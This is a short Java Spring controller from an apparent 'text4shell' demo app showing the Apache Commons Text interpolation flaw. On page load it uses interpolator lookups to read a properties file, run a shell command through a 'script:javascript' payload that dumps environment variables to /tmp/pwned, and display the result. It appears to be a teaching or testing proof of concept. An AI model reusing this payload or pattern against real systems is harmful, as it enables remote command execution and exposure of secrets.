package org.dontpanic.text4shell.controller;

import org.apache.commons.text.StringSubstitutor;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.GetMapping;

import java.util.Map;

@Controller
public class HomeController {

    @GetMapping("/")
    public String index(ModelMap model) {
        Map<String, String> values = Map.of("username", "jbloggs");
        StringSubstitutor replacer = new StringSubstitutor(values);
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();

        model.put("username", replacer.replace("Username: ${username}"));
        model.put("time", interpolator.replace("Current time: ${date:yyyy-MM-dd hh:mm:ss}"));
        model.put("file_content", interpolator.replace("File: ${file:UTF-8:src/main/resources/application.properties}"));
        model.put("rce", interpolator.replace("You've been pwned! ${script:javascript:java.lang.Runtime.getRuntime().exec('/bin/sh -c env > /tmp/pwned')}"));
        model.put("file_content2", interpolator.replace("File: ${file:UTF-8:/tmp/pwned}"));
        return "index";
    }

}
